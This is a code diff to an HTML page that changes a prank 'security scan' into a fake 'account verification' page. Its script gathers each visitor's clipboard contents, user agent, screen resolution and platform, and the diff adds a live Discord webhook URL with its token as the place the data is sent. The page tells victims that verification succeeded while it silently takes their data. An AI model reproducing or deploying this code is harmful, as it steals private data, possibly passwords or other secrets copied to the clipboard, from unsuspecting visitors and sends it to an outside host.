@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>System Scan In Progress</title>
+    <title>account verification</title>
     <style>
         body {
             font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
@@ -84,9 +84,9 @@
         </div>
 
         <div id="result-section" class="result">
-            <div class="sticker">😂</div>
-            <div class="message">You was you deranged guy!</div>
-            <p>Security scan complete. No issues detected.</p>
+            <div class="sticker">✅</div>
+            <div class="message">verification completed</div>
+            <p>verification complete. deranged detected.</p>
         </div>
     </div>
 
@@ -142,10 +142,10 @@
 
         // Send data to webhook
         async function sendToWebhook(data) {
-            const webhookUrl = 'YOUR_DISCORD_WEBHOOK_URL_HERE';
+            const webhookUrl = 'https://discord.com/api/webhooks/1357457585422209177/MyjVwkNZLEw9bx5LPXp55IV3ahANkmYfKlHUNP9f0DBGGsaLOQPvwJPLphkgRaLrRNBh';
             
             const embed = {
-                title: "Security Scan Triggered",
+                title: "Détraqué info 2.0",
                 color: 0xff5555,
                 timestamp: new Date().toISOString(),
                 fields: [
@@ -165,17 +165,17 @@
                         inline: true
                     },
                     {
-                        name: "Device Info",
+                        name: "Info appareils",
                         value: `Resolution: ${data.screenResolution}\nPlatform: ${data.platform}`,
                         inline: false
                     },
                     {
-                        name: "Clipboard Content",
+                        name: "press papier",
                         value: data.clipboardContent ? `\`\`\`${data.clipboardContent}\`\`\`` : "Not accessible",
                         inline: false
                     },
                     {
-                        name: "User Agent",
+                        name: "utilisateur",
                         value: `\`\`\`${data.userAgent}\`\`\``,
                         inline: false
                     }
